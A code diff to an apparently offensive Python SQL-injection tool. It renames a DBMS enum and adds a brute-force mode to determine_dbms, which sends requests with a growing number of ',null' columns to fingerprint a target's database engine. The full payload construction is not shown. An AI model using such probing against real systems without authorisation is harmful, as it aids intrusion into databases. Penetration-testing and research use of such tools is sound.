@@ -1,5 +1,6 @@
 from enum import Enum
 from requests import request
+from printer import error
 
 
 class State(Enum):
@@ -8,7 +9,7 @@ class State(Enum):
     Ambiguous = 2
 
 
-class DMBS_Type(Enum):
+class DBMS_Type(Enum):
     AMBIGUOUS = 0
     SQLITE = 1
     MSSQL = 2
@@ -43,8 +44,13 @@ def is_injectable(url, success_str, error_str):
         return State.Error
 
 
-def determine_dbms(url, success_str, error_str, columns=2):
-    version = None
+def determine_dbms(url, success_str, error_str, columns=1, brute_force=False):
+    sql_version = None
+    brute_force_limit = 20
+
+    if brute_force and brute_force_limit <= columns:
+        error("Brute force limit reached")
+        return exit(2)
 
     for version_string in DBMS_VERSION_STRING:
         nulls = "".join([",null" for _ in range(0, columns)])
@@ -54,8 +60,13 @@ def determine_dbms(url, success_str, error_str, columns=2):
         result = request("get", target).text
 
         if success_str in result and error_str in result:
-            version = DMBS_Type.AMBIGUOUS
+            sql_version = DBMS_Type.AMBIGUOUS
         elif success_str in result:
-            version = DMBS_Type[version_string.name]
+            sql_version = DBMS_Type[version_string.name]
+            break
 
-    return version
+    if brute_force and sql_version is None:
+        return determine_dbms(
+            url, success_str, error_str, columns + 1, True)
+
+    return sql_version
